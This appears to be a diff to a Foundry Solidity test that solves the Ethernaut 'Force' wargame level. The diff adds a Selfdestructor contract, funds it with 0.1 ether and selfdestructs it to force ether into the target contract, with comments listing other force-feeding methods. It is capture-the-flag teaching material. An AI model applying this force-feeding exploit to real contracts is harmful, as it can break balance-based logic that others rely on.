@@ -29,6 +29,20 @@ contract ForceTest is Test {
         // LEVEL ATTACK //
         //////////////////
 
+        // There is several ways to force feed ether to a contract
+        // 1. Selfdestruct
+        // 2. Pre-calculated Deployments
+        // 3. Block Rewards and Coinbase
+        // source: https://consensys.github.io/smart-contract-best-practices/attacks/force-feeding/
+        // Here, selfdestruct will be used
+
+        // Create a contract that will selfdestruct
+        Selfdestructor selfdestructor = new Selfdestructor(address(ethernautForce));
+        // Send ether to the contract
+        address(selfdestructor).call{value: 0.1 ether}("");
+        // Selfdestruct and send ether to target
+        selfdestructor.forceFeeding();
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
@@ -36,4 +50,19 @@ contract ForceTest is Test {
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
     }
+}
+
+contract Selfdestructor {
+    address payable force;
+
+    constructor(address _force) {
+        require(_force.code.length > 0, "Not a contract");
+        force = payable(_force);
+    }
+
+    function forceFeeding() external {
+        selfdestruct(force);
+    }
+
+    receive() external payable {}
 }
